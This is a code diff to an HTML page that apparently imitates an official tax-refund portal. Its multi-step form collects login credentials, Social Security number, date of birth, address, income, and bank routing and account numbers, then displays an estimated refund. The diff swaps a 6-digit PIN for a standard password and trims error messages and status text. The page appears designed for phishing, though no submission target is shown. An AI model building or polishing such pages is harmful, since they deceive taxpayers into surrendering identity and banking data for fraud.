@@ -14,7 +14,7 @@
         .error-border { border: 2px solid #dc3545 !important; }
         .success-text { color: #28a745; font-weight: bold; }
 
-        /* Session Display Styling at Top */
+        /* Session Display Styling at Top Fixed Bar */
         .top-email-bar {
             background-color: #002868;
             color: white;
@@ -38,6 +38,7 @@
             padding: 5px 12px;
             border-radius: 4px;
             border: 1px solid rgba(255,255,255,0.2);
+            align-items: center;
         }
         
         .status-dot {
@@ -50,7 +51,7 @@
             box-shadow: 0 0 5px rgba(40, 167, 69, 0.5);
         }
 
-        /* 6-Digit PIN Input Styling */
+        /* Verification Code Styling (Still 6 digits for MFA) */
         .pin-input-container {
             position: relative;
             margin: 15px 0;
@@ -71,20 +72,8 @@
             margin: 0 auto;
             display: block;
         }
-        .pin-error-text {
-            color: #d63031;
-            font-size: 0.85rem;
-            font-weight: 600;
-            margin-top: 10px;
-            display: none;
-            padding: 8px;
-            background: #fff5f5;
-            border-radius: 4px;
-        }
 
-        /* Adjust main container for fixed top bar */
-        body { padding-top: 60px; }
-
+        /* Fixed Logout Button Styling */
         #btn-logout-top {
             background: #fff !important;
             color: #dc3545 !important;
@@ -102,7 +91,14 @@
             color: #fff !important; 
         }
 
+        /* Adjust main container for fixed top bar */
+        body { padding-top: 60px; }
+
         @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
+
+        @media (max-width: 480px) {
+            input::placeholder { font-size: 1rem; }
+        }
     </style>
 </head>
 <body>
@@ -131,14 +127,12 @@
             
             <div id="auth-forms">
                 <form id="register-form" style="display:none;">
-                    <p style="font-size:0.8rem; color:#666;">Note: Account password must be a 6-digit PIN.</p>
+                    <p style="font-size:0.8rem; color:#666;">Note: Password must be alphanumeric and over 7 characters.</p>
                     <label for="reg-email">Email (Username)</label>
                     <input id="reg-email" type="email" required placeholder="name@example.com" />
                     
-                    <div class="pin-input-container">
-                        <label style="display:block; margin-bottom:10px; font-weight:bold; color:#002868;">SET 6-DIGIT PASSWORD PIN</label>
-                        <input id="reg-password" type="text" class="styled-pin-input" inputmode="numeric" maxlength="6" autocomplete="new-password" placeholder="------" required />
-                    </div>
+                    <label for="reg-password" style="font-weight:bold; color:#002868;">SET PASSWORD</label>
+                    <input id="reg-password" type="password" placeholder="Min 8 characters" required />
                     
                     <label for="reg-name">Legal Full Name</label>
                     <input id="reg-name" type="text" required />
@@ -156,10 +150,8 @@
                     <label for="login-email">Authorized Email</label>
                     <input id="login-email" type="email" required />
                     
-                    <div class="pin-input-container">
-                        <label style="display:block; margin-bottom:10px; font-weight:bold; color:#002868;">6-DIGIT PASSWORD PIN</label>
-                        <input id="login-password" type="text" class="styled-pin-input" inputmode="numeric" maxlength="6" autocomplete="current-password" placeholder="------" required />
-                    </div>
+                    <label for="login-password" style="font-weight:bold; color:#002868;">PASSWORD</label>
+                    <input id="login-password" type="password" required />
                     
                     <div style="margin-top:8px; text-align:right;">
                         <a href="#" id="forgot-link" style="font-size:0.85rem; color:#0056b3;">Forgot secure password?</a>
@@ -190,10 +182,8 @@
                         <input id="reset-code" type="text" class="styled-pin-input" inputmode="numeric" maxlength="6" autocomplete="off" placeholder="------" />
                     </div>
 
-                    <div class="pin-input-container">
-                        <label style="display:block; margin-bottom:10px; font-weight:bold; color:#002868;">NEW 6-DIGIT PASSWORD PIN</label>
-                        <input id="reset-password" type="text" class="styled-pin-input" inputmode="numeric" maxlength="6" placeholder="------" required />
-                    </div>
+                    <label for="reset-password" style="font-weight:bold; color:#002868;">NEW PASSWORD</label>
+                    <input id="reset-password" type="password" placeholder="Min 8 characters" required />
                     
                     <div style="margin-top:15px; display:flex; gap:10px;">
                         <button id="btn-reset-submit" class="btn btn-primary" type="button">Reset Password</button>
@@ -207,8 +197,8 @@
                     </div>
                     <div class="pin-input-container">
                         <label style="display:block; margin-bottom:10px; font-weight:bold; color:#002868;">SECURE PIN ENTRY</label>
-                        <input id="mfa-code" type="text" class="styled-pin-input" inputmode="numeric" maxlength="6" autocomplete="one-time-code" placeholder="------" />
-                        <div id="mfa-error-msg" class="pin-error-text">Error: The PIN entered is incorrect. Please check your email.</div>
+                        <input id="mfa-code" type="text" class="styled-pin-input" inputmode="numeric" maxlength="6" placeholder="------" />
+                        <div id="mfa-error-msg" style="color:red; display:none; padding-top:10px;">Invalid Code.</div>
                     </div>
                     <div style="margin-top:15px;">
                         <button id="btn-verify-mfa" class="btn btn-primary" type="button" style="width:100%; height:50px; font-size:1.1rem;">Validate PIN</button>
@@ -229,6 +219,7 @@
     </div>
 
     <form id="refund-form" novalidate>
+        <!-- STEP 1: Selection -->
         <div class="step-content active" data-step="1">
             <div class="form-group official-seal-bg" style="padding:15px;">
                 <label for="tax-year">Select Tax Filing Period *</label>
@@ -256,6 +247,7 @@
             </div>
         </div>
 
+        <!-- STEP 2: Identity -->
         <div class="step-content" data-step="2" style="display:none;">
             <p class="security-note">Sensitive identity fields are masked for your protection. Ensure accuracy to avoid audit delays.</p>
             <div class="form-group">
@@ -271,14 +263,12 @@
                 <input type="tel" id="phone" name="phone" placeholder="555-555-5555" maxlength="12">
             </div>
             <div class="form-group">
-                <label for="dob">Date of Birth * (MM/DD/YYYY)</label>
+                <label for="dob-main">Date of Birth * (MM/DD/YYYY)</label>
                 <input type="text" id="dob-main" name="dob" placeholder="MM/DD/YYYY" maxlength="10" required>
-                <small>Type your birth date manually (e.g. 01/01/1990)</small>
             </div>
             <div class="form-group">
                 <label for="ssn">Social Security Number (9 Digits) *</label>
                 <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
-                <div id="ssn-error" style="color:red; font-size:0.75rem; display:none;">Invalid SSN Format.</div>
             </div>
             <div class="form-group">
                 <label for="address">Primary Residential Address *</label>
@@ -286,6 +276,7 @@
             </div>
         </div>
 
+        <!-- STEP 3: Financials -->
         <div class="step-content" data-step="3" style="display:none;">
             <div class="form-group">
                 <label for="gross-income">Adjusted Gross Income (AGI) *</label>
@@ -314,6 +305,7 @@
             </div>
         </div>
 
+        <!-- STEP 4: Banking -->
         <div class="step-content" data-step="4" style="display:none;">
             <h3 style="color:#002868;">Electronic Funds Transfer (EFT)</h3>
             <div class="form-group">
@@ -323,7 +315,6 @@
             <div class="form-group">
                 <label for="routing-number">9-Digit Routing Number *</label>
                 <input type="text" id="routing-number" name="routingNumber" maxlength="9" required>
-                <div id="routing-error" style="color:red; font-size:0.75rem; display:none;">Must be exactly 9 digits.</div>
             </div>
             <div class="form-group">
                 <label for="account-number">Personal Account Number *</label>
@@ -331,6 +322,7 @@
             </div>
         </div>
 
+        <!-- STEP 5: Audit/Review -->
         <div class="step-content" data-step="5" style="display:none;">
             <h3 style="color:#002868;">Final Review of Application</h3>
             <div class="review-data" id="review-summary" style="padding:20px; background:#f0f7ff; border:1px solid #002868; border-radius:8px;">
@@ -357,21 +349,12 @@
     <div id="final-results-page" style="display:none; text-align:center; padding:40px;">
         <div style="font-size: 80px; color: #28a745;">✓</div>
         <h2 style="color:#002868;">Submission Received</h2>
-        <p style="font-size:1.1rem; margin-bottom:20px;">Your tax refund has been calculated and submitted for final treasury audit.</p>
-        
         <div style="background:#eef9f0; padding:20px; border-radius:15px; margin:20px 0; border:2px dashed #28a745;">
-            <p style="margin:0; color:#555;">Estimated Refund Amount:</p>
-            <h1 style="font-size:3.5rem; color:#28a745; margin:10px 0;">$<span id="display-refund-amount">0.00</span></h1>
+            <p>Estimated Refund Amount:</p>
+            <h1 style="font-size:3.5rem; color:#28a745;">$<span id="display-refund-amount">0.00</span></h1>
         </div>
-
-        <div style="text-align:left; background:#fff; border:1px solid #ddd; padding:20px; border-radius:10px; margin-bottom:30px;">
-            <p><strong>Application Ref:</strong> <span id="display-app-id"></span></p>
-            <p><strong>Disbursement Status:</strong> <span style="color:#d35400;">Pending Verification</span></p>
-            <hr>
-            <p style="font-size:0.9rem; color:#666; line-height:1.5;"><strong>Important:</strong> Our agents are currently reviewing your documents for accuracy. We will get back to you shortly via the email provided. You can expect to receive your refund later once the verification process is successfully finalized.</p>
-        </div>
-        
-        <button onclick="window.location.reload()" class="btn btn-primary" style="padding:15px 40px;">Return to Portal Home</button>
+        <p><strong>Application Ref:</strong> <span id="display-app-id"></span></p>
+        <button onclick="window.location.reload()" class="btn btn-primary">Return to Portal Home</button>
     </div>
 </div>
 
